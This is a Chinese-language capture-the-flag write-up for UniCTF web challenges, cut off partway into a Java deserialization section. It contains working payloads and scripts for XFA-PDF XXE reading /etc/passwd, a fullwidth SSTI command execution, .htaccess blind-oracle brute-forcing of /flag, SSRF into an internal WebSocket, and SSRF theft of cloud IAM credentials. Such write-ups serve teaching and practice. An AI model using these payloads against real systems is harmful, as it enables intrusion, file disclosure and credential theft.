---
title: "Unictf-wp(个人wp，勿喷)"
date: 2026-01-31 00:00:00
categories:
  - WP
tags:
  - CTF
  - UniCTF
  - Web
  - Misc
  - Crypto
description: "UniCTF 个人 Writeup，记录 Web、Misc 和 Crypto 题目的分析过程与解题代码。"
cover: /images/wp/unictf-wp/cover.jpg
disableNunjucks: true
---

## web
### SecureDoc
页面是一个pdf上传，下面还给了提示

 文件功能支持说明：  
• 标准PDF文本提取  
• PDF表单与交互元素  
• 基于XFA的动态表单  
• 元数据提取

强调了XFA，这和极客的那个pdf阅览如出一辙，

XFA (XML Forms Architecture) 是一种基于 XML 的表单架构，它被嵌入在 PDF 内部。

通常通用的 PDF 解析库（如 Python 的 PyPDF2 或 JS 的 pdf.js）是不太支持 XFA 的。题目特意强调支持 **XFA**，这意味着后端极有可能使用了特定的库（比如 `Adobe Reader` 的某些组件，或者 Java 的 `iText` 等）来解析 XML，所以很明显可能有着XXE漏洞

XML外部实体注⼊（XXE）是⼀种Web安全漏洞，允许攻击者⼲扰应⽤程序对XML数据的处理。攻击者可以利⽤XXE漏洞查看应⽤

程序服务器⽂件系统上的⽂件，并与应⽤程序可以访问的任何后端或外部系统进⾏交互。

#### XXE漏洞的⼯作原理
XXE漏洞发⽣在应⽤程序解析XML输⼊时，没有禁⽌外部实体的加载，导致可以加载恶意外部⽂件和代码。XML⽂档可以定义实体，这些实体是存储⽂档中其他地⽅重复使⽤的数据的⽅式。外部实体是⼀种特殊类型的实体，其内容被定义在XML⽂档外部。

当应⽤程序解析含有外部实体引⽤的XML⽂档时，如果没有正确地限制或禁⽌这些外部实体的使⽤，攻击者可以通过构造包含恶意外部实体的XML⽂档来实现攻击⽬的。例如，攻击者可以创建⼀个XML⽂件，其中包含⼀个外部实体，该实体引⽤了服务器上的敏感⽂件

再看前端源码中

```text
if (response.ok) {
    // ...
    setTimeout(() => window.location.href = `/preview/${data.file_id}`, 1000);
}
```

猜测上传成功后，会跳转到/preview/文件ID

看 HTML：

```text
<input type="file" id="fileInput" accept=".pdf">
```

看 JS：

```text
const formData = new FormData();
formData.append('file', fileInput.files[0]);
// ... fetch post ...
```

文件上传没有做过滤，整体攻击思路

+ 构造一个包含恶意 XFA 数据流的 PDF。
+ 在这个 XFA 的 XML 数据中插入 XXE payload（引用外部实体，比如读取 `/etc/passwd` 或 `flag`）。
+ 当后端解析这个“动态表单”时，就会触发 XML 解析器去读取文件

创建XML

```text
cat > xxe_xfa.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xfa [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
  <xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
    <xfa:data>
      <root>&xxe;</root>
    </xfa:data>
  </xfa:datasets>
</xdp:xdp>
EOF
```

创建PDF

```text
cat > test.pdf << 'EOF'
%PDF-1.5
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /AcroForm << /XFA 3 0 R >>
>>
endobj

2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj

3 0 obj
<< /Length 123 >>
stream
EOF
```

拼接进去

```text
cat xxe_xfa.xml >> test.pdf
```

```text
cat >> test.pdf << 'EOF'
endstream
endobj

4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
>>
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000080 00000 n
0000000150 00000 n
0000000300 00000 n
trailer
<< /Size 5 /Root 1 0 R >>
startxref
360
%%EOF
EOF
```

上传

```text
curl -v -X POST \
  -F "file=@test.pdf" \
  http://5000-a7347351-7117-4ce1-80a5-05dd9b41332d.challenge.ctfplus.cn/upload
```

![](/images/wp/unictf-wp/image-001.png)

明显看到了file_id,符合我们预期，

直接访问[http://5000-a7347351-7117-4ce1-80a5-05dd9b41332d.challenge.ctfplus.cn/preview/37c769d6-d071-4476-9aca-311c1cfcb158](http://5000-a7347351-7117-4ce1-80a5-05dd9b41332d.challenge.ctfplus.cn/preview/37c769d6-d071-4476-9aca-311c1cfcb158)

![](/images/wp/unictf-wp/image-002.png)

利用成功，读到了系统文件，要读flag把上面的XML注入改一下就行

```text
cat > xxe_xfa.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xfa [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
  <xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
    <xfa:data>
      <root>&xxe;</root>
    </xfa:data>
  </xfa:datasets>
</xdp:xdp>
EOF
```

其他步骤一样，再上传得到文件id，访问

![](/images/wp/unictf-wp/image-003.png)

![](/images/wp/unictf-wp/image-004.png)









### GlyphWeaver
给了个名片生成器的功能，直接看源码

![](/images/wp/unictf-wp/image-005.png)

这里提示了jinja2，明显是ssti漏洞，开始测试

![](/images/wp/unictf-wp/image-006.png)

明显有过滤，直接试全角字体

![](/images/wp/unictf-wp/image-007.png)

使用了全角字符 `｛% ... %｝` 后，服务器没有报 `Unsafe`，而且返回的 JSON 里明确显示 `"normalize: NFKC applied"`。这证明服务器确实先把我们的全角字符转换成了半角字符，然后才进行处理。waf绕过了但是并没有执行

html里

```text
<div class="card__motto" data-motto="{% print 7*7 %}"></div>
```

这意味着在 **Preview（预览）** 阶段，后端可能只是把变量安全地填入了 HTML 属性中（类似于 `value="{{ motto }}"`），而没有对其进行二次渲染。

猜测导出那有漏洞，可能是一个二阶ssti漏洞

用户输入 -> WAF (检测) -> **NFKC 标准化 (清洗并变成攻击代码)** -> 存入数据库/缓存

具体的请求逻辑写在 `/static/app.js` 里了，我们去拿js代码

```text
curl http://5000-39f72d7c-c3a3-4d06-86cd-67fe35f1c95a.challenge.ctfplus.cn/static/app.js
```

```text
const form = document.getElementById("preview-form");

const target = document.getElementById("preview-target");

const meta = document.getElementById("preview-meta");

const exportForm = document.getElementById("export-form");

const exportStatus = document.getElementById("export-status");

const exportLog = document.getElementById("export-log");

const exportResult = document.getElementById("export-result");

const taskIdInput = document.getElementById("task-id");

const taskCheck = document.getElementById("task-check");

const previewSubmit = document.getElementById("preview-submit");

const exportSubmit = document.getElementById("export-submit");

function getPayload(targetForm) {

const formData = new FormData(targetForm);

return Object.fromEntries(formData.entries());

}

async function renderPreview(payload) {

if (!meta || !target) {

return;
}

meta.textContent = "Rendering...";

const response = await fetch("/api/preview", {

method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload),
});

if (!response.ok) {

const error = await response.json().catch(() => ({})); target.innerHTML = '<div class="live__error">Render blocked.</div>'; meta.textContent = error.error || \`Error ${response.status}\`; return;
}

const data = await response.json();

target.innerHTML = data.html;

meta.textContent = (data.meta && data.meta.normalize_log || []).join(" | ") || "No changes.";

}

async function createExport(payload) {

if (!exportStatus || !exportLog || !exportResult) {

return;
}

exportStatus.textContent = "Creating export task...";

exportLog.textContent = "";

exportResult.textContent = "";

const response = await fetch("/api/export", {

method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload),
});

if (!response.ok) {

const error = await response.json().catch(() => ({})); exportStatus.textContent = error.error || \`Error ${response.status}\`; return;
}

const data = await response.json();

if (taskIdInput) {

taskIdInput.value = data.taskId || "";
}

exportStatus.textContent = `Task created: ${data.taskId}`;

}

async function checkTask(taskId) {

if (!exportStatus || !exportLog || !exportResult) {

return;
}

if (!taskId) {

exportStatus.textContent = "Provide a taskId first."; return;
}

exportStatus.textContent = "Checking task...";

const response = await fetch(`/api/task/${taskId}`);

if (!response.ok) {

const error = await response.json().catch(() => ({})); exportStatus.textContent = error.error || \`Error ${response.status}\`; return;
}

const data = await response.json();

exportStatus.textContent = `Status: ${data.status}`;

exportLog.textContent = (data.log || []).join("\n");

exportResult.innerHTML = data.html || "";

}

if (previewSubmit && form) {

previewSubmit.addEventListener("click", () => {

renderPreview(getPayload(form));
});

}

if (exportSubmit && exportForm) {

exportSubmit.addEventListener("click", () => {

createExport(getPayload(exportForm));
});

}

if (taskCheck && taskIdInput) {

taskCheck.addEventListener("click", () => {

checkTask(taskIdInput.value.trim());
});

}
```

找到查询接口

```text
const response = await fetch(`/api/task/${taskId}`);
```

测试config对象存在，直接利用

```text
curl -X POST http://5000-39f72d7c-c3a3-4d06-86cd-67fe35f1c95a.challenge.ctfplus.cn/api/export \
     -H "Content-Type: application/json" \
     -d '{
           "template_id": "classic",
           "display_name": "Hacker",
           "title": "Test",
           "motto": "｛｛ｃｏｎｆｉｇ．＿＿ｃｌａｓｓ＿＿．＿＿ｉｎｉｔ＿＿．＿＿ｇｌｏｂａｌｓ＿＿［＇ｏｓ＇］．ｐｏｐｅｎ（＇ｃａｔ　／ｆｌａｇ＇）．ｒｅａｄ（）｝｝",
           "footer": "RCE"
         }'
```

拿到taskId去访问得到flag

![](/images/wp/unictf-wp/image-008.png)





### ezUpload
![](/images/wp/unictf-wp/image-009.png)

一个文件上传题目，下面给了黑名单，测试一下，测试 利用 UTF-7、EBCDIC 编码等方式绕过内容检测，可惜

文件都能上传成功，但是访问时总是返回 Access Denied  ，明显这是服务端返回的，说明有waf，试了很多方法，上传空文件依然会拒绝访问， 使用一种**彻底不兼容 ASCII** 的编码：**IBM037 (EBCDIC)**依然报错，

显然这个waf是绕不过的，全局waf，服务端是不会让你执行php文件的，在这卡了很久



后来尝试 利用 Apache 的 SSI 功能（`.shtml`）执行命令。 

 Apache 的 SSI（服务端包含）允许在 HTML 文件中执行系统命令（``）。如果能开启 SSI，我们就能让 **Apache 直接执行命令**，完全绕过 PHP 引擎，也就绕过了那个讨厌的 PHP WAF。  

 有过滤，舍弃。

 Apache 2.4 引入了强大的 **Expression Engine (表达式引擎)**。配合 `mod_headers`，可以直接在 `.htaccess` 中**读取文件内容并将其写入 HTTP 响应头**！  

```text
# 1. 生成 .htaccess
# 利用 Apache 表达式直接读取 /flag 并写在头里
# 这个字符串里没有任何禁止字符，完美通过上传检查
echo 'Header set X-Flag "expr=%{file:/flag}"' > .htaccess

# 2. 上传配置
echo -e "\n[*] Uploading Apache Expression Exploit..."
curl -A "Mozilla/5.0" -X POST -F "file=@.htaccess" $TARGET

# 3. 触发
# 访问目录下任意一个存在的文件（比如之前的 empty.php 或 shell.php）
# 使用 -I 参数只看响应头 (Headers)
echo -e "\n[*] Checking Headers for Flag..."
curl -A "Mozilla/5.0" -I "${TARGET}upload/empty.php"
```

可是403了，  `mod_headers` 模块  应该被ban了应该是，

Apache里还有指令

**ErrorDocument**：当你访问不存在的文件时，Apache 会把 `/flag` 的内容当作 404 错误页面的内容显示出来。

**Redirect**：当你访问特定路径时，Apache 会把 `/flag` 的内容放在 `Location` 跳转头里发回来。

依然不支持，但是返回的500和403有了启发，看题目中有 Blind Directive (盲注指令)

明显我们是看不到flag的，需要布尔判断来猜解，

 Apache 2.4 中有一个指令可以直接使用表达式，且不需要 `<` 标签，那就是 `**Require expr**`。 可以用它来直接控制访问权限：**“如果表达式为真，则允许访问 (200)；如果为假，则拒绝访问 (403)。”**

测试一下，不要用php，否则只会返回403，我们写入txt中

```text
# 1. 上传靶子文件
echo "I am a text file." > test.txt
echo -e "\n[*] Uploading test.txt..."
curl -A "Mozilla/5.0" -X POST -F "file=@test.txt" $TARGET
```

校准真状态

```text
# 2. 上传 True Payload (.htaccess)
echo "Require expr \"'a' == 'a'\"" > .htaccess
curl -A "Mozilla/5.0" -X POST -F "file=@.htaccess" $TARGET

# 3. 触发 (访问 test.txt)
# 预期：HTTP/1.1 200 OK
echo -e "\n[*] Testing True on .txt (Expect 200):"
curl -A "Mozilla/5.0" -I "${TARGET}upload/test.txt"
```

校准假状态

```text
# 4. 上传 False Payload (.htaccess)
echo "Require expr \"'a' == 'b'\"" > .htaccess
curl -A "Mozilla/5.0" -X POST -F "file=@.htaccess" $TARGET

# 5. 触发 (访问 test.txt)
# 预期：HTTP/1.1 403 Forbidden
echo -e "\n[*] Testing False on .txt (Expect 403):"
curl -A "Mozilla/5.0" -I "${TARGET}upload/test.txt"
```

成功一个返回200，一个返回403，利用txt作为靶子猜解flag

exp

```text
import requests
import string
import sys

# === 配置 ===
URL = "http://YOUR_CHALLENGE_URL/"  # 填入题目地址
UPLOAD_URL = URL + "upload/"
TARGET_FILE = "test.txt"

# 字符集优先级：先跑普通字符，最后跑会触发通配符的特殊符号
chars = "_-" + string.ascii_letters + string.digits + "{}@!?"
flag = "UniCTF" # 已知开头

print(f"[*] Target: {URL}")
print(f"[*] Oracle: 200 OK = True, 403 Forbidden = False")

# 1. 确保靶子存在
try:
    requests.post(URL, files={'file': (TARGET_FILE, 'static target')}, timeout=5)
except:
    pass

while True:
    found_char = False
    for c in chars:
        # === 正则绕过核心 ===
        # 题目禁止反斜杠，无法转义。
        # 遇到正则关键字，降级为 . (通配符)
        if c in ".?*+()[]{}|^$":
            regex_char = "." 
            is_wildcard = True
        else:
            regex_char = c
            is_wildcard = False
            
        current_guess_regex = flag + regex_char
        
        # 构造 .htaccess Payload
        htaccess_content = f'Require expr "file(\'/flag\') =~ /^{current_guess_regex}/"'
        
        try:
            # 上传配置
            files = {'file': ('.htaccess', htaccess_content)}
            requests.post(URL, files=files, timeout=3)
            
            # 访问静态文件探测
            r = requests.head(UPLOAD_URL + TARGET_FILE, timeout=3)
            
            if r.status_code == 200:
                if is_wildcard:
                    print(f"\n[?] Wildcard match used for char '{c}'")
                flag += c
                print(f"\n[+] Found: {flag}")
                found_char = True
                break
            elif r.status_code == 403:
                print(".", end="", flush=True)
                
        except Exception:
            pass
            
    if not found_char:
        break
        
    if flag.endswith("}"):
        print(f"\n\n[SUCCESS] FLAG CAPTURED: {flag}")
        break
```









### ezUpload Revenge!!
其实上一题已经算非预期解了，这题和上题没区别，ban了require，一个测试脚本

```text
import requests
import string
import sys

# === 配置 ===
URL = "http://80-6b8e8eeb-d590-4b84-9b76-03dccc085aec.challenge.ctfplus.cn/"
UPLOAD_URL = URL + "upload/"
TARGET_FILE = "test.txt"

# 字符集
chars = "_-" + string.ascii_letters + string.digits + "{}@!?"
flag = "UniCTF"

print(f"[*] Revenge Target: {URL}")
print(f"[*] Strategy: mod_rewrite [F]")
print("[*] Oracle: 403 Forbidden = True (Found), 200 OK = False")

# 1. 确保 test.txt 存在
try:
    requests.post(URL, files={'file': (TARGET_FILE, 'static file')}, timeout=5)
except:
    pass

while True:
    found_char = False
    for c in chars:
        # 正则通配符处理 (\ 被禁)
        if c in ".?*+()[]{}|^$":
            regex_char = "." 
            is_wildcard = True
        else:
            regex_char = c
            is_wildcard = False
            
        current_guess_regex = flag + regex_char
        
        # 构造 Payload (Rewrite 版)
        # 如果 file('/flag') 匹配正则，则触发 [F] Forbidden
        htaccess_content = f"""RewriteEngine On
RewriteCond expr "file('/flag') =~ /^{current_guess_regex}/"
RewriteRule ^ - [F]"""
        
        try:
            # 上传
            files = {'file': ('.htaccess', htaccess_content)}
            requests.post(URL, files=files, timeout=3)
            
            # 探测
            r = requests.head(UPLOAD_URL + TARGET_FILE, timeout=3)
            
            # 逻辑反转：403 是 True
            if r.status_code == 403:
                if is_wildcard:
                    print(f"\n[?] Wildcard match used for char '{c}'")
                
                flag += c
                print(f"\n[+] Found: {flag}")
                found_char = True
                break
            elif r.status_code == 200:
                print(".", end="", flush=True)
            elif r.status_code == 500:
                print("X", end="", flush=True) # 语法错误
            else:
                print(f"[{r.status_code}]", end="", flush=True)
                
        except Exception as e:
            pass
            
    if not found_char:
        print("\n[-] Stopped.")
        break
        
    if flag.endswith("}"):
        print(f"\n\n[SUCCESS] FLAG CAPTURED: {flag}")
        break
```

发现

+ **RewriteEngine**：可用。
+ **expr 关键字**：可用（因为你在测试 B 中使用了 `expr`）。
+ **file() 函数**：也可用（你在测试中已经包含了 `file('/etc/passwd')`）。

不用想 使用 `RewriteCond expr` 代替 `Require expr`

和上题测试一下真假返回是否无误，依然盲注猜解flag

```text
import requests
import string
import sys
import time

# === 配置 ===
URL = "http://80-6b8e8eeb-d590-4b84-9b76-03dccc085aec.challenge.ctfplus.cn/"
UPLOAD_URL = URL + "upload/"
TARGET_FILE = "test.txt"

# 字符集：先跑下划线和减号，然后是字母数字
chars = "_-" + string.ascii_letters + string.digits + "{}@!?"
flag = "UniCTF"

print(f"[*] Revenge Target: {URL}")
print(f"[*] Strategy: mod_rewrite [F]")
print("[*] Oracle: 403 Forbidden = True (Found), 200 OK = False")

# 1. 确保 test.txt 存在
try:
    requests.post(URL, files={'file': (TARGET_FILE, 'static file')}, timeout=5)
except:
    pass

while True:
    found_char = False
    for c in chars:
        # 正则通配符处理 (\ 被禁)
        if c in ".?*+()[]{}|^$":
            regex_char = "." 
            is_wildcard = True
        else:
            regex_char = c
            is_wildcard = False
            
        current_guess_regex = flag + regex_char
        
        # 构造 Payload (Rewrite 版)
        # 如果 file('/flag') 匹配正则，则触发 [F] Forbidden
        htaccess_content = f"""RewriteEngine On
RewriteCond expr "file('/flag') =~ /^{current_guess_regex}/"
RewriteRule ^ - [F]"""
        
        try:
            # 上传
            files = {'file': ('.htaccess', htaccess_content)}
            # 设置较短超时
            requests.post(URL, files=files, timeout=3)
            
            # 探测
            r = requests.head(UPLOAD_URL + TARGET_FILE, timeout=3)
            
            # 逻辑反转：403 是 True
            if r.status_code == 403:
                if is_wildcard:
                    print(f"\n[?] Wildcard match used for char '{c}'")
                
                flag += c
                print(f"\n[+] Found: {flag}")
                found_char = True
                break
            elif r.status_code == 200:
                print(".", end="", flush=True)
            elif r.status_code == 500:
                print("X", end="", flush=True) # 语法错误
            else:
                print(f"[{r.status_code}]", end="", flush=True)
                
        except Exception as e:
            pass
            
    if not found_char:
        print("\n[-] Stopped.")
        break
        
    if flag.endswith("}"):
        print(f"\n\n[SUCCESS] FLAG CAPTURED: {flag}")
        break
```

 `mod_rewrite`它是一个**基于规则的过滤引擎**，其处理阶段非常靠前，且拥有极其强大的表达式解析能力（`ap_expr`）。

.`RewriteCond expr`：Web 服务器的“条件判断”

通常大家只用 `RewriteCond %{HTTP_HOST} ...` 这种简单的判断，但它支持 `expr` 参数。

+ **语法**：`RewriteCond expr "表达式"`
+ **底层函数**：它调用的 `file()` 函数是 Apache 内置的。这个函数是在 **Web Server 进程权限**下运行的，它可以跳过 PHP 的 `open_basedir` 限制，直接读取系统文件（如 `/flag`）。

`[F]` 标志位：强制阻断

在 `RewriteRule` 中，`[F]` 代表 **Forbidden**。

+ **原理**：一旦前面的 `RewriteCond` 条件成立，Apache 会立即停止后续处理，并直接向客户端返回 **403 状态码**。
+ **盲注利用**：这提供了一个完美的 **Oracle（预言机）**。通过观察是 403 还是 200，我们就能反推出 `RewriteCond` 里的布尔表达式是否成立。



### Intrasight
给了一个预览服务，看源码

+ 页面有一个输入框 `id="urlInput"`，默认值是 `http://127.0.0.1/`。
+ 点击按钮触发 `doFetch()` 函数。
+ JS 逻辑发起请求：`fetch(/fetch?url=${encodeURIComponent(url)})`。

明显这是一个典型的 **SSRF (Server-Side Request Forgery)** 场景。

源码中

```text
// 特殊处理 WebSocket
if (url.startsWith('ws://') || url.startsWith('wss://')) {
     // 对于 ws，我们用同样的 fetch 端点
     log('检测到 WebSocket 协议，尝试握手...', 'info');
}
```

 大多数简单的 SSRF 题目只处理 HTTP/HTTPS。如果后端允许 `ws://`，这通常意味着后端使用的 HTTP 库支持流式传输，或者更常见的情况——**后端是一个 Headless Browser (无头浏览器，如 Chrome/Puppeteer)**，或者是为了支持某种特定的 WebSocket 内部服务。  

```text
curl "http://[URL]/fetch?url=http://127.0.0.1/openapi.json"
```

  现代 Web 应用（尤其是使用 FastAPI、Flask-apispec 或 NestJS 构建的应用）中，`/openapi.json` 或 `/swagger.json` 会暴露所有 API 接口的定义、参数要求以及隐藏的端点。  

![](/images/wp/unictf-wp/image-010.png)

 服务通常被映射到邻近的端口。既然 80 是 `public_web`，那么 8001 极有可能就是那个被混淆的服务  

```text
curl "http://80-e1ece385-70c3-4c78-b6f5-8b25b6d5c1b8.challenge.ctfplus.cn/fetch?url=http%3A%2F%2Flocalhost%3A8001%2Fredirect_ws"
```

![](/images/wp/unictf-wp/image-011.png)

这个 `302` 重定向直接暴露了内网最核心的秘密：

1. **真正的后台地址**：`ws://127.0.0.1:9000/ws`。
2. **身份凭证 (Token)**：`token=bb22781480174c8e8c39fc04fb22549a`。
3. **确认混淆服务名**：结合 `w*_*e*1*r` 和 `9000` 端口，

后面crlf注入失败，测试一番，看一下8001是否还暴露了其他接口

```text
curl "http://80-e1ece385-70c3-4c78-b6f5-8b25b6d5c1b8.challenge.ctfplus.cn/fetch?url=http%3A%2F%2Flocalhost%3A8001%2Fopenapi.json"
```

![](/images/wp/unictf-wp/image-012.png)

 ，`config` 路由经常会泄露敏感的内网 Token、环境变量或者是内部服务的真实地址。  明显能看到 ，`/api/debug/config`的路径，直接看配置了什么东西

```text
curl "http://80-e1ece385-70c3-4c78-b6f5-8b25b6d5c1b8.challenge.ctfplus.cn/fetch?url=http%3A%2F%2Flocalhost%3A8001%2Fapi%2Fdebug%2Fconfig"
```

![](/images/wp/unictf-wp/image-013.png)

+ **目标锁定**：`ws://127.0.0.1:9000/ws` 就是我们要攻克的堡垒。
+ **防御机制**：它强制要求 `X-Internal-Token` Header 与 `?token` 参数匹配，且 `Origin` 必须是 `http://127.0.0.1`。
+ **失败原因**：我们尝试的 **CRLF 注入** 被后端拦截返回了 `Internal Server Error`，说明后端 fetcher（预览工具）对 URL 字符做了严格的安全过滤。
+ **关键信息**：`admin_panel` 的 `openapi.json` 显示它除了 `/redirect_ws`，并没有直接提供带 Header 请求的功能。

后面试了一下，最后 尝试**“Header 走私”**——把 Token 放在原本发给 `public_web` 的请求头里，赌它会转发给内网。  

```text
import requests
import re
import time

# 目标基础 URL
BASE_URL = "http://80-e1ece385-70c3-4c78-b6f5-8b25b6d5c1b8.challenge.ctfplus.cn"

def solve():
    session = requests.Session()
    
    print("[*] 正在获取最新 Token...")
    # 1. 访问 8001 获取重定向中的 Token
    # 我们使用 allow_redirects=False 来手动截获 Location
    target_url = f"{BASE_URL}/fetch?url=http://localhost:8001/redirect_ws"
    r1 = session.get(target_url)
    
    # 从返回的 JSON 'history' 中提取 token
    # 数据结构参考: "location":"ws://127.0.0.1:9000/ws?token=..."
    try:
        token = re.search(r'token=([a-f0-9]+)', r1.text).group(1)
        print(f"[+] 成功捕获 Token: {token}")
    except AttributeError:
        print("[-] 未能找到 Token，请检查 8001 端口是否响应。")
        return

    # 2. 构造终极打击 Payload
    # 我们同时尝试在 URL 中携带 Token，并在 Header 中带上身份信息
    # 赌后端会转发 X-Internal-Token 和 Origin
    ws_ssrf_url = f"ws://127.0.0.1:9000/ws?token={token}"
    headers = {
        "X-Internal-Token": token,
        "Origin": "http://127.0.0.1",
        "User-Agent": "Mozilla/5.0 (Internal Preview Tool)"
    }
    
    attack_url = f"{BASE_URL}/fetch?url={requests.utils.quote(ws_ssrf_url)}"
    
    print(f"[*] 正在发射 SSRF 载荷 (Token 时效竞争中...)...")
    r2 = session.get(attack_url, headers=headers)
    
    print("\n[!] 响应结果:")
    print(r2.text)

if __name__ == "__main__":
    solve()
```

握手成功 绕过了 `Origin` 和 `X-Internal-Token` 的双重校验。  

![](/images/wp/unictf-wp/image-014.png)

 发现它是一个**远程模板渲染引擎（Template Rendering Engine）**。看到 `render` 和 `template` 字样，几乎可以确定存在 **SSTI，**猜测是jinja2的模板，直接注入命令

```text
import requests
import re

BASE_URL = "http://80-e1ece385-70c3-4c78-b6f5-8b25b6d5c1b8.challenge.ctfplus.cn"

def solve():
    session = requests.Session()
    
    # 1. 抢夺 Token
    print("[*] 正在抢夺 Token...")
    r1 = session.get(f"{BASE_URL}/fetch?url=http://localhost:8001/redirect_ws")
    token = re.search(r'token=([a-f0-9]+)', r1.text).group(1)
    print(f"[+] 捕获 Token: {token}")

    # 2. 构造 SSTI Payload (尝试读取 /flag)
    # 我们猜测是 Jinja2，利用 self.__init__.__globals__ 来读取文件
    # 如果读取失败，可以换成 {{7*7}} 验证漏洞
    ssti_payload = {
        "action": "render",
        "template": "{{ self.__init__.__globals__.__builtins__.open('/flag').read() }}",
        "context": {}
    }

    # 3. 发射总攻载荷 (使用 POST 方法)
    ws_url = f"ws://127.0.0.1:9000/ws?token={token}"
    attack_url = f"{BASE_URL}/fetch?url={requests.utils.quote(ws_url)}"
    
    headers = {
        "X-Internal-Token": token,
        "Origin": "http://127.0.0.1",
        "Content-Type": "application/json"
    }
    
    print("[*] 正在通过 WebSocket 发射 SSTI 载荷...")
    # 注意：这里使用 json=ssti_payload 将数据放在 POST Body 中
    r2 = session.post(attack_url, headers=headers, json=ssti_payload)
    
    print("\n[!] 最终结果:")
    print(r2.text)

if __name__ == "__main__":
    solve()
```

![](/images/wp/unictf-wp/image-015.png)







### CloudDiag
> A cloud‑ops diagnostic portal that fetches configs, previews reports, and lets you browse resources. If you’re sensitive to where boundaries blur and how credentials flow, there may be an obvious route through.
>

看后明显是一个云安全的题

页面注册登录，登录后如下

![](/images/wp/unictf-wp/image-016.png)

+ **功能点分析**：
+ `/tasks/new`：用户提供一个 `config_url`，服务器会抓取该 URL 内容并尝试解析（JSON/YAML）。这是典型的 **SSRF 注入点**。
+ `/explorer`：云资源浏览器，允许输入 AWS 凭证（Access Key, Secret Key, Session Token）来列出 S3 存储桶内容。
+ **环境线索**：页面页脚提示：“CloudDiag runs in a cloud environment with instance roles for diagnostics.”。这暗示了服务器可能拥有一个 **IAM 角色**，我们可以通过 SSRF 访问本地元数据服务（Instance Metadata Service, IMDS）来窃取它。

通常 IMDS 位于 `169.254.169.254`，但直接访问该 IP 往往会被防火墙拦截。我们需要探测本地回环地址（Localhost）。

**核心技巧：十进制 IP 绕过与端口枚举** 为了绕过某些简单的字符串过滤，我们将 `127.0.0.1` 转换为十进制形式：`2130706433`。经过枚举，发现模拟的元数据服务运行在 **1338** 端口。

1. 探测 IAM 角色名称

首先需要知道具体的角色名字，访问路径：`/latest/meta-data/iam/security-credentials/`。

```text
curl -v -L -b cookies.txt \
     -d "config_url=http://2130706433:1338/latest/meta-data/iam/security-credentials/&name=get_role&parse_mode=auto" \
     "$CTF_HOST/tasks/new"
```

 页面回显 `clouddiag-instance-role`

. 获取临时凭证

拼接角色名，获取包含 `AccessKeyId`、`SecretAccessKey` 和 `Token` 的 JSON 凭证。

```text
curl -v -L -b cookies.txt \
     -d "config_url=http://2130706433:1338/latest/meta-data/iam/security-credentials/clouddiag-instance-role&name=get_cred&parse_mode=json" \
     "$CTF_HOST/tasks/new"
```

**得到凭证（示例）：**

+ **AccessKeyId**: `AKIAC52CD6A0850941E1`
+ **SecretAccessKey**: `d3fe09925e3e456bb65f8d158e0a79910e7df7e2cef14bda9bd4abf60efbd836`
+ **Token**: `c8fff5090dea43b39c18a5ace70dc04b6641e1ad60004b34adb0d587f4093ce3`

---

利用凭证接管云存储

拿到“钥匙”后，前往 `/explorer` 功能区进行资源枚举。

1. 列出所有存储桶 (Buckets)

```text
curl -v -L -b cookies.txt \
     -d "access_key=AKIAC52CD6A0850941E1&secret_key=d3fe09925e3e456bb65f8d158e0a79910e7df7e2cef14bda9bd4abf60efbd836&session_token=c8fff5090dea43b39c18a5ace70dc04b6641e1ad60004b34adb0d587f4093ce3&bucket=" \
     "$CTF_HOST/explorer"
```

**发现敏感 Bucket：**`clouddiag-secrets`。

2. 列出敏感 Bucket 中的文件

```text
curl -v -L -b cookies.txt \
     -d "access_key=AKIAC52CD6A0850941E1&secret_key=d3fe09925e3e456bb65f8d158e0a79910e7df7e2cef14bda9bd4abf60efbd836&session_token=c8fff5090dea43b39c18a5ace70dc04b6641e1ad60004b34adb0d587f4093ce3&bucket=clouddiag-secrets" \
     "$CTF_HOST/explorer"
```

**发现 Flag 路径：**`flags/runtime/flag-d97482e9e420493b9a8a0f3f7cd5b38e.txt`。

3. 读取最终 Flag

```text
curl -v -L -b cookies.txt \
     -d "access_key=AKIAC52CD6A0850941E1&secret_key=d3fe09925e3e456bb65f8d158e0a79910e7df7e2cef14bda9bd4abf60efbd836&session_token=c8fff5090dea43b39c18a5ace70dc04b6641e1ad60004b34adb0d587f4093ce3&bucket=clouddiag-secrets&object_key=flags/runtime/flag-d97482e9e420493b9a8a0f3f7cd5b38e.txt" \
     "$CTF_HOST/explorer"
```





### ez Java
给了个jar包，反编译拿关键源码

网页给了提交接口：同步功能仅支持上传由 InternalManager 导出的二进制配置包 (Base64格式)。

请通过 API 接口提交参数: configData

 暴露了一个数据导入接口 `/api/user/settings/import`。该接口接收 `configData` 参数，并将其作为 Java 序列化流进行处理。  

源码过多，给出关键源码

---

1. 流量入口：`UserProfileController.class`

这是漏洞的起点。注意看它在调用 `readObject` 前后的操作。

```text
@PostMapping({"/api/user/settings/import"})
public String importSettings(@RequestParam("configData") String configData) {
    try {
        // 1. Base64 解码参数
        byte[] decoded = Base64.getDecoder().decode(configData);
        ByteArrayInputStream bais = new ByteArrayInputStream(decoded);
        
        // 2. 自定义 DataInputStream 校验（这是我们为什么要手动写 UTF 和 Int 的原因）
        DataInputStream dis = new DataInputStream(bais);
        String managerType = dis.readUTF();
        int version = dis.readInt();
        
        // 校验身份：必须是 InternalManager 且版本是 2025
        if (!"InternalManager".equals(managerType) || version != 2025) {
            return "ERROR: Malformed configuration stream.";
        }

        // 3. 进入真正的反序列化
        ObjectInputStream ois = new ObjectInputStream(dis);
        Object obj = ois.readObject();

        // 4. 关键触发点：这里隐式调用了 obj.toString()
        // 在 Java 日志打印中，"Object: " + obj 会自动调用 obj 的 toString 方法
        logger.info("Configuration synchronized: " + obj); 
        
